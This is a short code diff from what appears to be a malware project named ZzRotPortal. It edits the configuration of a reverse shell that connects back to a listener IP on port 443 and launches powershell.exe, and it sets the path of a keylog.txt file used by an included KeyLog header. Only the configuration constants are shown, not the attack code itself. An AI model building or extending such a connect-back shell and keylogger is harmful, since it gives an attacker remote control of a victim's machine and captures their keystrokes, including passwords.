@@ -23,7 +23,7 @@
 #define POLL_RATE 6000 // how long to try connecting back when timed out
 #define CHILD_NAME "powershell.exe" // name of the remote process to run
 // Comms settings
-#define LISTENER_IP L"192.168.239.148"
+#define LISTENER_IP L"192.168.1.12"
 #define LISTENER_PORT 443
 
 #ifdef DEBUG
@@ -33,5 +33,5 @@
 #endif
 
 #include "Helpers.h"
-#define FILE_NAME L"C:\\Users\\athena\\source\\repos\\ZzRotPortal\\ZzRotPortal\\keylog.txt"
+#define FILE_NAME L"C:\\Users\\Athena\\source\\repos\\ZzRotPortal\\ZzRotPortal\\keylog.txt"
 #include "KeyLog.h"
